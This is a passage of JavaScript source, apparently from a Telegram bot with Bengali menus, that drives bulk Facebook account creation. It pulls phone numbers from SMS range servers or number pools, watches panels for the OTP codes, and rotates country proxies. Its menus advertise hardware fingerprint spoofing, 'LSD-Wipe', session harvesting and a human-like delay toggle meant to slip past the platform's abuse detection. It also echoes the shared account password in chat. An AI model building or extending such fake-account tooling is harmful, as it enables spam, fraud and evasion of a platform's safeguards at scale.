      selCountry = countries.find((c) => c.available > 0) || countries[0];
      writeUserConfig(uid, { fb_tools_country_id: selCountry.id });
    }
    const activePanelsCnt = readPanelsStore().panels.filter((p) => p.active !== false).length;
    const proxyPoolEffective = getEffectiveProxyPool(uid);
    const proxyCount = proxyPoolEffective.length;
    const humanDelayOn = cfg.fb_tools_human_delay === true;
    const otpResendCount = Math.max(1, Math.min(10, Number(cfg.fb_tools_otp_resends ?? 5)));
    const autoReplaceOn = cfg.fb_tools_auto_replace !== false;
    const run = activeRuns.get(uid);

    // Pre-warm range lists & GQL session silently in background so next clicks feel instantaneous
    if (src === '2oo9' && srv1Ready) void fetch2oo9LiveAccess(resolveFbTools2oo9Keys(), resolveFbToolsVoltexUrl()).catch(() => {});
    else if (src === 'lamix' && srv2Ready) void fetchLamixRanges(resolveFbToolsLamixToken()).catch(() => {});
    void harvestGqlSessionDirect(false, { timeoutMs: 7000 }).catch(() => {});

    const lines = [
      `🛠 <b>FB TOOLS • LOL অটো অ্যাকাউন্ট ক্রিয়েটর</b>`,
      DIVIDER,
      `📦 <b>নাম্বার সার্ভার:</b> <b>${escapeHtml(srcLabel)}</b>`,
      `🔐 <b>সেভ করা পাসওয়ার্ড:</b> ${pwBadge}`,
      `🔁 <b>অটো OTP সেন্ড/রিসেন্ড:</b> <code>${otpResendCount} বার</code> (১–১০x • প্রতিবার প্রক্সি ON→OFF)`,
      `♻️ <b>OTP না এলে অটো নতুন অ্যাকাউন্ট:</b> ${autoReplaceOn ? '🟢 চালু' : '🔴 বন্ধ'}`,
      `⏱ <b>Human Delay (মানুষের মতো স্পিড):</b> ${humanDelayOn ? '🟢 চালু' : '🔴 বন্ধ'}`,
      `🧬 <b>ইঞ্জিন ও সুরক্ষা:</b> <code>Limited+Classic • Hardware FP • LSD-Wipe • GQL</code>`,
      `🌐 <b>কান্ট্রি প্রক্সি (অটো শর্ট-নেম):</b> <code>${proxyCount}</code>টি (অটো দেশ: 🟢 • অটো ON/OFF: 🟢)`,
    ];

    if (src === '2oo9') {
      lines.push(`🔌 <b>সার্ভার ১ কানেকশন:</b> ${srv1Ready ? '🟢 অ্যাডমিন কর্তৃক চালু ও প্রস্তুত' : '🔴 অ্যাডমিন এখনো চালু করেনি'}`);
      lines.push(
        `🌐 <b>সিলেক্টেড রেঞ্জ / দেশ:</b> ${cfg.fb_tools_2oo9_range ? `★ <code>${escapeHtml(cfg.fb_tools_2oo9_range_label || cfg.fb_tools_2oo9_range)}</code>` : '<i>সিলেক্ট করা নেই (নিচের ২ নং বাটনে চাপুন)</i>'}`
      );
    } else if (src === 'lamix') {
      lines.push(`🔌 <b>সার্ভার ২ কানেকশন:</b> ${srv2Ready ? '🟢 অ্যাডমিন কর্তৃক চালু ও প্রস্তুত' : '🔴 অ্যাডমিন এখনো চালু করেনি'}`);
      lines.push(
        `📘 <b>সিলেক্টেড রেঞ্জ:</b> ${cfg.fb_tools_lamix_range ? `★ <code>${escapeHtml(cfg.fb_tools_lamix_label || cfg.fb_tools_lamix_range)}</code>` : '<i>সিলেক্ট করা নেই (নিচের ২ নং বাটনে চাপুন)</i>'}`
      );
    } else if (src === 'pool') {
      lines.push(
        `🌍 <b>সিলেক্টেড দেশ:</b> ${selCountry ? `<b>${escapeHtml(selCountry.name)}</b> (খালি নাম্বার: <code>${selCountry.available}</code>)` : '<i>অ্যাডমিন এখনো দেশ যোগ করেনি</i>'}`
      );
      lines.push(`🔌 <b>অ্যাক্টিভ OTP প্যানেল:</b> <code>${activePanelsCnt}</code>টি`);
    } else {
      lines.push(`📝 <b>মোড:</b> নিজের নাম্বার পেস্ট বা <code>.txt</code> ফাইল দিলে অটো চেক করে একসাথে অ্যাকাউন্ট বানাবে।`);
    }

    lines.push('');
    if (run?.running) {
      lines.push(`⚡ <b>কাজ চলছে:</b> <code>${run.completed}/${run.total}</code> (✅ তৈরি: ${run.okCount} • 🔐 অপেক্ষা: ${run.pendingCount})`);
    } else {
      lines.push(
        `💡 <b>কোন বাটনে কী হয় (সহজ নির্দেশিকা):</b>`,
        `• <b>১. শুরু করুন</b> — অ্যাকাউন্ট বানিয়ে অটো <b>${otpResendCount}x</b> প্রক্সি রোটেশনসহ OTP পাঠাবে ও রিসিভ না হলে নতুন নাম্বারে খুলবে`,
        `• <b>২. দেশ / রেঞ্জ</b> — যে দেশের নাম্বার নিবেন, অটো সেই দেশের শর্ট নেম (ISO) দিয়ে প্রক্সি চলবে`,
        `• <b>৩ ও ৪. পাসওয়ার্ড</b> — সব নতুন অ্যাকাউন্টের পাসওয়ার্ড সেভ রাখে ও দেখতে দেয়`,
        `• <b>৫. সার্ভার স্ট্যাটাস</b> — LOL সার্ভার (ON/OFF) ও লাইভ কানেকশন চেক করে`,
        `• <b>৬. নাম্বার সার্ভার</b> — কোন সার্ভার থেকে নাম্বার নিবেন তা পরিবর্তন করুন`
      );
    }

    const rows = [
      [btnOk('🚀 ১. অ্যাকাউন্ট তৈরি শুরু করুন', 'fbtools:start_flow')],
      [
        btnOk(
          src === 'pool'
            ? '🌍 ২. দেশ বাছাই করুন (Pool)'
            : src === 'custom'
            ? '📝 ২. নাম্বার পেস্ট / ফাইল দিন'
            : '🌐 ২. দেশ / রেঞ্জ বাছাই করুন',
          'fbtools:pick_target'
        ),
      ],
      [
        btnNav(savedPw ? '🔑 ৩. পাসওয়ার্ড বদলান' : '🔑 ৩. পাসওয়ার্ড সেট করুন', 'fbtools:setpw'),
        btnNav('👁 ৪. পাসওয়ার্ড দেখুন', 'fbtools:viewpw'),
      ],
      [
        btnNav('📡 ৫. সার্ভার স্ট্যাটাস', 'fbtools:server_status'),
        btnNav('⚙️ ৬. নাম্বার সার্ভার পরিবর্তন', 'fbtools:source_menu'),
      ],
      [
        btnOk(`🔁 OTP রিসেন্ড: ${otpResendCount}x (১–১০)`, 'fbtools:otp_resends_menu'),
        autoReplaceOn ? btnOk('♻️ অটো নতুন নাম্বার: চালু', 'fbtools:toggle_auto_replace') : btnBad('♻️ অটো নতুন নাম্বার: বন্ধ', 'fbtools:toggle_auto_replace'),
      ],
      [
        humanDelayOn ? btnOk('⏱ Human Delay: চালু', 'fbtools:toggle_delay') : btnBad('⏱ Human Delay: বন্ধ', 'fbtools:toggle_delay'),
        btnOk('🔄 রিফ্রেশ', 'menu:fb_tools'),
      ],
    ];

    if (run?.running) {
      rows.push([btnBad('🛑 চলমান কাজ বন্ধ করুন', 'menu:stop')]);
    }
    rows.push([btnNav('⬅️ মেইন মেনুতে ফিরুন', 'menu:home')]);

    const kb = { inline_keyboard: rows };
    const txt = lines.join('\n');
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderFbToolsCountPicker(chatId, uid, editMsgId) {
    const cfg = readUserConfig(uid);
    const savedPw = resolveFbToolsPassword(cfg);
    if (!savedPw || savedPw.length < 6) {
      const msg = '⚠️ <b>আগে পাসওয়ার্ড সেট করুন!</b>\nঅ্যাকাউন্ট তৈরির জন্য কমপক্ষে ৬ অক্ষরের পাসওয়ার্ড সেট করতে হবে।';
      const kb = { inline_keyboard: [[btnOk('🔑 পাসওয়ার্ড সেট করুন', 'fbtools:setpw')], [btnNav('⬅️ FB Tools মেনু', 'menu:fb_tools')]] };
      if (editMsgId) await editMessage(chatId, editMsgId, msg, kb);
      else await sendMessage(chatId, msg, kb);
      return;
    }

    const { src, short: srcShort } = getFbToolsSourceMeta(cfg);
    if (src === 'custom') {
      promptSessions.set(uid, { kind: 'awaiting_fbtools_custom_nums' });
      const msg = `📝 <b>কাস্টম নাম্বার দিন</b>\n${DIVIDER}\nফোন নাম্বারগুলো নিচে পেস্ট করুন (প্রতি লাইনে ১টি) অথবা <code>.txt</code> ফাইল পাঠান। বট অটো GQL চেক করে ফ্রি নাম্বারে অ্যাকাউন্ট তৈরি করবে ও লাইভ OTP দেখাবে:`;
      const kb = { inline_keyboard: [[btnBad('❌ বাতিল', 'menu:fb_tools')]] };
      if (editMsgId) await editMessage(chatId, editMsgId, msg, kb);
      else await sendMessage(chatId, msg, kb);
      return;
    }

    let targetDesc = '';
    if (src === '2oo9') {
      if (resolveFbTools2oo9Keys().length === 0) {
        const msg = '⚠️ <b>LOL সার্ভার ১</b> এখনো অ্যাডমিন চালু করেনি। অনুগ্রহ করে <b>LOL সার্ভার ২</b> বা <b>Admin Pool</b> ব্যবহার করুন।';
        const kb = { inline_keyboard: [[btnNav('⚙️ সার্ভার বদলান', 'fbtools:source_menu'), btnNav('⬅️ FB Tools মেনু', 'menu:fb_tools')]] };
        if (editMsgId) await editMessage(chatId, editMsgId, msg, kb);
        else await sendMessage(chatId, msg, kb);
        return;
      }
      if (!cfg.fb_tools_2oo9_range) {
        await renderFbTools2oo9Ranges(chatId, uid, 0, false, editMsgId);
        return;
      }
      targetDesc = `★ ${cfg.fb_tools_2oo9_range_label || cfg.fb_tools_2oo9_range}`;
    } else if (src === 'lamix') {
      if (!resolveFbToolsLamixToken()) {
        const msg = '⚠️ <b>LOL সার্ভার ২</b> এখনো অ্যাডমিন কনফিগার করেনি। অনুগ্রহ করে সার্ভার বদলে <b>LOL সার্ভার ১</b> বা <b>Admin Pool</b> ব্যবহার করুন।';
        const kb = { inline_keyboard: [[btnNav('⚙️ সার্ভার বদলান', 'fbtools:source_menu'), btnNav('⬅️ FB Tools মেনু', 'menu:fb_tools')]] };
        if (editMsgId) await editMessage(chatId, editMsgId, msg, kb);
        else await sendMessage(chatId, msg, kb);
        return;
      }
      if (!cfg.fb_tools_lamix_range) {
        await renderFbToolsLamixRanges(chatId, uid, 0, false, editMsgId);
        return;
      }
      targetDesc = `★ ${cfg.fb_tools_lamix_label || cfg.fb_tools_lamix_range}`;
    } else {
      const countries = getCountryInventoryStats();
      let selCountry = countries.find((c) => c.id === Number(cfg.fb_tools_country_id));
      if (!selCountry || selCountry.available <= 0) {
        selCountry = countries.find((c) => c.available > 0) || selCountry;
        if (selCountry) writeUserConfig(uid, { fb_tools_country_id: selCountry.id });
      }
      if (!selCountry || selCountry.available <= 0) {
        const msg = '⚠️ অ্যাডমিন পুলে এখন কোনো খালি নাম্বার নেই। অন্য সার্ভার ব্যবহার করুন অথবা পরে চেষ্টা করুন।';
        const kb = { inline_keyboard: [[btnNav('⚙️ সার্ভার বদলান', 'fbtools:source_menu'), btnNav('⬅️ FB Tools মেনু', 'menu:fb_tools')]] };
        if (editMsgId) await editMessage(chatId, editMsgId, msg, kb);
        else await sendMessage(chatId, msg, kb);
        return;
      }
      targetDesc = `${selCountry.name} (${selCountry.available}টি নাম্বার আছে)`;
    }

    const txt = [
      `📊 <b>একসাথে কতটি অ্যাকাউন্ট তৈরি করবেন? (MAX 15)</b>`,
      DIVIDER,
      `📦 <b>সার্ভার:</b> <code>${escapeHtml(srcShort)}</code>`,
      `🌐 <b>সিলেক্টেড দেশ / রেঞ্জ:</b> <b>${escapeHtml(targetDesc)}</b>`,
      `🔐 <b>পাসওয়ার্ড:</b> <code>${escapeHtml(savedPw)}</code>`,
      ``,
      `নিচের ৫টি LOL প্রিসেট বা কাস্টম সংখ্যা থেকে বেছে নিন:`,
    ].join('\n');

    const kb = {
      inline_keyboard: [
        [btnOk('1️⃣ ১টি অ্যাকাউন্ট (BASIC)', 'fbtools:start:1')],
        [btnOk('2️⃣ ২টি অ্যাকাউন্ট (STANDARD)', 'fbtools:start:2')],
        [btnOk('3️⃣ ৩টি অ্যাকাউন্ট (MEDIUM)', 'fbtools:start:3')],
        [btnOk('4️⃣ ৪টি অ্যাকাউন্ট (HIGH)', 'fbtools:start:4')],
        [btnOk('5️⃣ ৫টি অ্যাকাউন্ট (MAX LIMIT)', 'fbtools:start:5')],
        [btnNav('🔢 নিজের মতো সংখ্যা লিখুন (১–১৫)', 'fbtools:custom_count')],
        [btnNav('🌐 দেশ / রেঞ্জ বদলান', 'fbtools:pick_target'), btnNav('🔙 FB Tools মেনু', 'menu:fb_tools')],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderFbToolsSourceMenu(chatId, uid, editMsgId) {
    const cfg = readUserConfig(uid);
    const { src, label } = getFbToolsSourceMeta(cfg);
    const srv1Ready = resolveFbTools2oo9Keys().length > 0;
    const srv2Ready = Boolean(resolveFbToolsLamixToken());
    const activePanelsCnt = readPanelsStore().panels.filter((p) => p.active !== false).length;

    const lines = [
      `⚙️ <b>FB TOOLS • নাম্বার সার্ভার পরিবর্তন</b>`,
      DIVIDER,
      `বর্তমান সার্ভার: <b>${escapeHtml(label)}</b>`,
      ``,
      `🌐 <b>১. LOL সার্ভার ১ (লাইভ রেঞ্জ):</b> ${srv1Ready ? '🟢 প্রস্তুত (অ্যাডমিন সেট করা)' : '🔴 বন্ধ আছে'}`,
      `🌍 <b>২. অ্যাডমিন পুল:</b> অ্যাডমিনের যুক্ত করা নাম্বার + <code>${activePanelsCnt}</code>টি OTP সার্ভার`,
      `📡 <b>৩. LOL সার্ভার ২ (প্রিমিয়াম):</b> ${srv2Ready ? '🟢 প্রস্তুত (অ্যাডমিন সেট করা)' : '🔴 বন্ধ আছে'}`,
      `📝 <b>৪. কাস্টম নাম্বার:</b> নিজের নাম্বার পেস্ট বা <code>.txt</code> ফাইল`,
      ``,
      `<i>যে সার্ভার থেকে নাম্বার নিতে চান তা নিচ থেকে বেছে নিন:</i>`,
    ];

    const kb = {
      inline_keyboard: [
        [
          src === '2oo9' ? btnOk('✅ LOL সার্ভার ১', 'fbtools:src:2oo9') : btnNav('🌐 LOL সার্ভার ১', 'fbtools:src:2oo9'),
          src === 'pool' ? btnOk('✅ অ্যাডমিন পুল', 'fbtools:src:pool') : btnNav('🌍 অ্যাডমিন পুল', 'fbtools:src:pool'),
        ],
        [
          src === 'lamix' ? btnOk('✅ LOL সার্ভার ২', 'fbtools:src:lamix') : btnNav('📡 LOL সার্ভার ২', 'fbtools:src:lamix'),
          src === 'custom' ? btnOk('✅ কাস্টম নাম্বার', 'fbtools:src:custom') : btnNav('📝 কাস্টম নাম্বার', 'fbtools:src:custom'),
        ],
        [
          btnOk('📡 সার্ভার স্ট্যাটাস টেস্ট', 'fbtools:server_status'),
          btnNav('🔙 FB Tools মেনু', 'menu:fb_tools'),
        ],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, lines.join('\n'), kb);
    else await sendMessage(chatId, lines.join('\n'), kb);
  }

  async function renderFbToolsServerStatus(chatId, uid, editMsgId) {
    const st = readSettings();
    const keys = resolveFbTools2oo9Keys();
    const lamixTok = resolveFbToolsLamixToken();
    const voltexUrl = resolveFbToolsVoltexUrl();
    const res = await checkHbxRemoteStatus(keys, lamixTok, voltexUrl);

    const lines = [
      `📡 <b>LOL সার্ভার লাইভ স্ট্যাটাস</b>`,
      DIVIDER,
      `🌐 <b>LOL মেইন ইঞ্জিন:</b> ${res.remoteOn ? '🟢 <b>ONLINE &amp; ACTIVE (ON)</b>' : `🔴 <b>OFFLINE / DISABLED</b>`}${res.remoteRaw ? ` [<code>${escapeHtml(res.remoteRaw)}</code>]` : ''}`,
      res.remoteErr ? `⚠️ নোট: <code>${escapeHtml(sanitizeProviderText(res.remoteErr))}</code>` : '',
      ``,
      `🔌 <b>LOL সার্ভার ১ (লাইভ রেঞ্জ):</b> ${keys.length === 0 ? '⚪ অ্যাডমিন চালু করেনি' : res.api2oo9Ok ? `🟢 <b>CONNECTED</b> (<code>${res.api2oo9RangesCount}</code>টি FB রেঞ্জ)` : `🔴 <b>${escapeHtml(sanitizeProviderText(res.api2oo9Err || 'Disconnected'))}</b>`}`,
      `📡 <b>LOL সার্ভার ২ (প্রিমিয়াম):</b> ${res.lamixOk === null ? '⚪ অ্যাডমিন চালু করেনি' : res.lamixOk ? `🟢 <b>CONNECTED</b> (<code>${res.lamixRangesCount}</code>টি রেঞ্জ)` : `🔴 ${escapeHtml(sanitizeProviderText(res.lamixErr || 'Disconnected'))}`}`,
      `🧩 <b>অ্যাডমিন OTP সার্ভার:</b> <code>${res.activePanelsCnt}</code>টি চালু`,
      `📢 <b>অফিশিয়াল চ্যানেল:</b> ${escapeHtml(st.channelUrl || DEFAULT_CHANNEL_URL)}`,
    ].filter(Boolean);

    const kb = {
      inline_keyboard: [
        [btnOk('🔄 আবার চেক করুন', 'fbtools:server_status'), btnNav('🌐 দেশ / রেঞ্জ দেখুন', 'fbtools:pick_target')],
        [btnNav('🔙 FB Tools মেনু', 'menu:fb_tools')],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, lines.join('\n'), kb);
    else await sendMessage(chatId, lines.join('\n'), kb);
  }

  async function renderFbTools2oo9Ranges(chatId, uid, page = 0, forceRefresh = false, editMsgId) {
    const cfg = readUserConfig(uid);
    const keys = resolveFbTools2oo9Keys();
    const voltexUrl = resolveFbToolsVoltexUrl();

    let cached = fbTools2oo9RangeCache.get(uid);
    if (!cached || forceRefresh || Date.now() - cached.ts > 60000) {
      const live = await fetch2oo9LiveAccess(keys, voltexUrl, forceRefresh);
      const ranges = live.ok ? getUnique2oo9Ranges(live.records, cfg.fb_tools_2oo9_range || '') : [];
      if (!live.ok || ranges.length === 0) {
        const errMsg = sanitizeProviderText(live.error || 'No active Facebook ranges returned');
        const kb = {
          inline_keyboard: [
            [btnOk('🔄 আবার চেষ্টা করুন', 'fbtools:2oo9_ranges_ref:0'), btnNav('⚙️ অন্য সার্ভার বাছাই', 'fbtools:source_menu')],
            [btnNav('🔙 FB Tools মেনু', 'menu:fb_tools')],
          ],
        };
        const msg = [
          `⚠️ <b>LOL সার্ভার ১ থেকে কোনো Facebook রেঞ্জ পাওয়া যায়নি</b>`,
          DIVIDER,
          `কারণ: <code>${escapeHtml(errMsg)}</code>`,
          ``,
          `💡 <b>সমাধান:</b>`,
          `• কিছুক্ষণ পর আবার রিফ্রেশ করুন, অথবা`,
          `• <b>⚙️ অন্য সার্ভার বাছাই</b> থেকে <b>🌍 অ্যাডমিন পুল</b> / <b>📡 LOL সার্ভার ২</b> সিলেক্ট করুন!`,
        ].join('\n');
        if (editMsgId) await editMessage(chatId, editMsgId, msg, kb);
        else await sendMessage(chatId, msg, kb);
        return;
      }
      cached = { ts: Date.now(), ranges };
      fbTools2oo9RangeCache.set(uid, cached);
    } else {
      // Refresh ★ marker for last used range
      cached.ranges = cached.ranges.map((r) => ({ ...r, isLast: Boolean(cfg.fb_tools_2oo9_range && r.id === cfg.fb_tools_2oo9_range) }));
    }

    const perPage = 8;
    const totalPages = Math.max(1, Math.ceil(cached.ranges.length / perPage));
    const safePage = Math.max(0, Math.min(page, totalPages - 1));
    const slice = cached.ranges.slice(safePage * perPage, safePage * perPage + perPage);

    const rows = [];
    const lines = [
      `📘 <b>FACEBOOK — দেশ ও রেঞ্জ তালিকা (${cached.ranges.length}টি)</b>`,
      DIVIDER,
      `<i>★ চিহ্ন মানে আপনার আগের ব্যবহার করা রেঞ্জ:</i>`,
      ``,
    ];
    slice.forEach((r, idx) => {
      const globalIdx = safePage * perPage + idx;
      const num = globalIdx + 1;
      const isSel = cfg.fb_tools_2oo9_range === r.id;
      lines.push(`${isSel ? '★' : '•'} <code>[${num}]</code> ${r.flag} <b>${escapeHtml(r.countryName)}</b> — <code>${escapeHtml(r.range)}</code>${r.count !== null ? ` (${r.count})` : ''}`);
      rows.push([
        (isSel ? btnOk : btnNav)(
          `${isSel ? '★ ' : ''}${r.flag} ${r.countryName.slice(0, 16)} • ${r.range.slice(0, 14)}`,
          `fbtools:pick2oo9:${safePage}:${globalIdx}`
        ),
      ]);
    });

    if (totalPages > 1) {
      const nav = [];
      if (safePage > 0) nav.push(btnNav('◀️ আগের পেজ', `fbtools:2oo9_ranges:${safePage - 1}`));
      nav.push(btnNav(`${safePage + 1}/${totalPages}`, `fbtools:2oo9_ranges:${safePage}`));
      if (safePage + 1 < totalPages) nav.push(btnNav('পরের পেজ ▶️', `fbtools:2oo9_ranges:${safePage + 1}`));
      rows.push(nav);
    }
    rows.push([
      btnOk('🔄 রেঞ্জ রিফ্রেশ করুন', `fbtools:2oo9_ranges_ref:${safePage}`),
      btnNav('🔙 FB Tools মেনু', 'menu:fb_tools'),
    ]);

    const kb = { inline_keyboard: rows };
    const txt = lines.join('\n');
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderFbToolsLamixRanges(chatId, uid, page = 0, forceRefresh = false, editMsgId) {
    const cfg = readUserConfig(uid);
    const token = resolveFbToolsLamixToken();
    if (!token) {
      await sendMessage(chatId, '⚠️ <b>LOL সার্ভার ২</b> এখনো অ্যাডমিন কনফিগার করেনি। অন্য সার্ভার বেছে নিন।', {
        inline_keyboard: [[btnNav('⚙️ সার্ভার বদলান', 'fbtools:source_menu'), btnNav('⬅️ FB Tools', 'menu:fb_tools')]],
      });
      return;
    }

    let cached = fbToolsLamixRangeCache.get(uid);
    if (!cached || forceRefresh || Date.now() - cached.ts > 60000) {
      const rRes = await fetchLamixRanges(token, forceRefresh);
      if (!rRes.ok || rRes.ranges.length === 0) {
        const cleanErr = rRes.error ? sanitizeProviderText(rRes.error) : '';
        await sendMessage(
          chatId,
          `⚠️ <b>LOL সার্ভার ২ থেকে কোনো সক্রিয় রেঞ্জ পাওয়া যায়নি</b>${cleanErr ? `\n<code>${escapeHtml(cleanErr)}</code>` : ''}\nঅন্য সার্ভার ব্যবহার করুন অথবা অ্যাডমিনকে জানান।`,
          { inline_keyboard: [[btnOk('🔄 রিফ্রেশ', 'fbtools:ranges_ref:0'), btnNav('⚙️ সার্ভার বদলান', 'fbtools:source_menu')], [btnNav('⬅️ FB Tools', 'menu:fb_tools')]] }
        );
        return;
      }
      cached = { ts: Date.now(), ranges: rRes.ranges };
      fbToolsLamixRangeCache.set(uid, cached);
    }

    const perPage = 8;
    const totalPages = Math.max(1, Math.ceil(cached.ranges.length / perPage));
    const safePage = Math.max(0, Math.min(page, totalPages - 1));
    const slice = cached.ranges.slice(safePage * perPage, safePage * perPage + perPage);

    const rows = [];
    const lines = [
      `📘 <b>LOL সার্ভার ২ — দেশ ও রেঞ্জ (${cached.ranges.length}টি)</b>`,
      DIVIDER,
    ];
    slice.forEach((r, idx) => {
      const num = safePage * perPage + idx + 1;
      const [cNameRaw, cIsoRaw] = getCountryInfo(r.clean_range || '');
      const fallbackIso = cIsoRaw !== '??' ? cIsoRaw : countryNameToIso(r.range);
      const cIso = fallbackIso || '??';
      const cName = cNameRaw !== 'Unknown' ? cNameRaw : (cIso !== '??' ? cIso : 'Server-2');
      const flag = isoToFlag(cIso);
      const cDisplay = cIso !== '??' ? `${cName} (${cIso})` : sanitizeProviderText(r.sid || 'Server-2') || 'Server-2';
      const isSel = cfg.fb_tools_lamix_range === r.id;
      lines.push(`${isSel ? '★' : '•'} <code>[${num}]</code> ${flag} <b>${escapeHtml(r.range)}</b> — <code>${escapeHtml(cDisplay)}</code>${r.count !== null ? ` (${r.count})` : ''}`);
      rows.push([
        (isSel ? btnOk : btnNav)(
          `${isSel ? '★ ' : ''}${flag} ${r.range.slice(0, 20)} • ${cIso !== '??' ? cIso : cDisplay.slice(0, 8)}`,
          `fbtools:pickrange:${safePage}:${num - 1}`
        ),
      ]);
    });

    if (totalPages > 1) {
      const nav = [];
      if (safePage > 0) nav.push(btnNav('◀️ আগের', `fbtools:ranges:${safePage - 1}`));
      nav.push(btnNav(`${safePage + 1}/${totalPages}`, `fbtools:ranges:${safePage}`));
      if (safePage + 1 < totalPages) nav.push(btnNav('পরের ▶️', `fbtools:ranges:${safePage + 1}`));
      rows.push(nav);
    }
    rows.push([
      btnOk('🔄 রেঞ্জ রিফ্রেশ', `fbtools:ranges_ref:${safePage}`),
      btnNav('⬅️ FB Tools', 'menu:fb_tools'),
    ]);

    const kb = { inline_keyboard: rows };
    const txt = lines.join('\n');
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderFbToolsPoolCountries(chatId, uid, page = 0, editMsgId) {
    const cfg = readUserConfig(uid);
    const countries = getCountryInventoryStats();
    const perPage = 6;
    const totalPages = Math.max(1, Math.ceil(countries.length / perPage));
    const safePage = Math.max(0, Math.min(page, totalPages - 1));
    const slice = countries.slice(safePage * perPage, safePage * perPage + perPage);

    const rows = [];
    for (let i = 0; i < slice.length; i += 2) {
      const row = [];
      for (const c of slice.slice(i, i + 2)) {
        const isSel = Number(cfg.fb_tools_country_id) === c.id;
        row.push((c.available > 0 ? (isSel ? btnOk : btnNav) : btnBad)(`${isSel ? '★ ' : ''}${c.name.slice(0, 18)} (${c.available})`, `fbtools:pickcountry:${c.id}`));
      }
      rows.push(row);
    }
    if (totalPages > 1) {
      const nav = [];
      if (safePage > 0) nav.push(btnNav('◀️ আগের', `fbtools:countries:${safePage - 1}`));
      nav.push(btnNav(`${safePage + 1}/${totalPages}`, `fbtools:countries:${safePage}`));
      if (safePage + 1 < totalPages) nav.push(btnNav('পরের ▶️', `fbtools:countries:${safePage + 1}`));
      rows.push(nav);
    }
    rows.push([btnNav('⬅️ FB Tools', 'menu:fb_tools')]);

    const txt = [
      `🌍 <b>FB TOOLS — অ্যাডমিন পুল দেশ বাছাই</b>`,
      DIVIDER,
      countries.length === 0 ? '<i>অ্যাডমিন এখনো কোনো দেশ যোগ করেনি।</i>' : 'অ্যাকাউন্ট তৈরির জন্য দেশ বেছে নিন:',
    ].join('\n');
    const kb = { inline_keyboard: rows };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderFbToolsLamixStatus(chatId, uid, editMsgId) {
    const tok = resolveFbToolsLamixToken();
    if (!tok) {
      await sendMessage(chatId, '⚠️ LOL সার্ভার ২ এখনো অ্যাডমিন কনফিগার করেনি।', {
        inline_keyboard: [[btnNav('⬅️ FB Tools', 'menu:fb_tools')]],
      });
      return;
    }
    const status = await checkLamixStatus(tok);
    const lines = [
      `🌐 <b>LOL সার্ভার ২ স্ট্যাটাস</b>`,
      DIVIDER,
      status.ok ? `🟢 <b>LOL সার্ভার ২ (প্রিমিয়াম) এর সাথে যুক্ত</b>` : `🔴 <b>সমস্যা:</b> <code>${escapeHtml(sanitizeProviderText(status.error))}</code>`,
      `📘 <b>রেঞ্জ:</b> <code>${status.rangesCount}</code>  •  📱 <b>নাম্বার স্যাম্পল:</b> <code>${status.numbersCount}</code>`,
      ``,
    ];
    if (status.messages.length > 0) {
      lines.push(`<b>সর্বশেষ মেসেজ (${Math.min(5, status.messages.length)}টি)</b>`);
      for (const m of status.messages.slice(0, 5)) {
        const f = getLamixMsgFields(m);
        lines.push(`• [<code>${escapeHtml(f.sender)}</code>] <code>+${escapeHtml(f.number)}</code> → <code>${escapeHtml(f.message.slice(0, 48))}</code>`);
      }
    }
    const kb = {
      inline_keyboard: [
        [btnOk('🔄 রিফ্রেশ', 'fbtools:lamix_status'), btnNav('⬅️ FB Tools', 'menu:fb_tools')],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, lines.join('\n'), kb);
    else await sendMessage(chatId, lines.join('\n'), kb);
  }

  async function runFbToolsMultiOtpWatcher(chatId, user, accounts, cfg, opts = {}) {
    const lamixTok = resolveFbToolsLamixToken();
    const keys2oo9 = resolveFbTools2oo9Keys();
    const voltexUrl = resolveFbToolsVoltexUrl();
    const use2oo9 = (opts.source === '2oo9' || keys2oo9.length > 0) && keys2oo9.length > 0;
    const hasActivePanels = readPanelsStore().panels.some((p) => p.active !== false);
    if (!use2oo9 && !lamixTok && !hasActivePanels) {
      return { otpsReceived: 0, verifiedCount: 0, stopped: false };
    }

    const st = readSettings();
    const timeoutMs = Math.min(20 * 60000, Math.max(2 * 60000, (Number(st.numberValidMinutes) || 20) * 60000));
    const started = Date.now();
    const seenKeys = new Set();
    const userCookie = readUserCookies(user.id);
    const uidKey = String(user.id);
    fbToolsWatchAbort.set(uidKey, false);

    // Pre-seed old historical SMS in parallel across ALL sources (including Lamix Panel always!)
    const [pre2, preL, preP] = await Promise.all([
      use2oo9 ? fetch2oo9SuccessOtps(keys2oo9, voltexUrl).catch(() => ({ ok: false, otps: [] })) : Promise.resolve({ ok: false, otps: [] }),
      lamixTok ? fetchLamixMessages(lamixTok, 100, false).catch(() => ({ ok: false, messages: [] })) : Promise.resolve({ ok: false, messages: [] }),
      hasActivePanels ? fetchAllActivePanelsSms(false).catch(() => ({ ok: false, rows: [] })) : Promise.resolve({ ok: false, rows: [] }),
    ]);
    if (pre2.ok) {
      for (const row of pre2.otps) seenKeys.add(`2O:${row.id}`);
    }
    if (preL.ok) {
      for (const row of preL.messages) {
        const f = getLamixMsgFields(row);
        if (f.id) seenKeys.add(`L:${f.id}`);
      }
    }
    if (preP.ok) {
      for (const row of preP.rows) seenKeys.add(`P:${smsRowKey(row)}`);
    }

    const animFrames = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];
    let checks = 0;
    let totalOtps = 0;
    let verifiedCount = 0;
    let latestOtp = null;
    const otpHistory = [];

    const fmtClock = (ms) => {
      const s = Math.max(0, Math.floor(ms / 1000));
      return `${String(Math.floor(s / 60)).padStart(2, '0')}:${String(s % 60).padStart(2, '0')}`;
    };

    const buildWatchKeyboard = (ended = false) => {
      const kbRows = [];
      for (const a of accounts.slice(0, 4)) {
        const tail = String(a.number || '').slice(-5);
        kbRows.push([
          btnOk(`📤 OTP (+${tail})`, `otp:pc_send:${a.number}`),
          btnNav(`📡 Lamix (+${tail})`, `otp:check_lamix:${a.number}`),
        ]);
      }
      if (ended) {
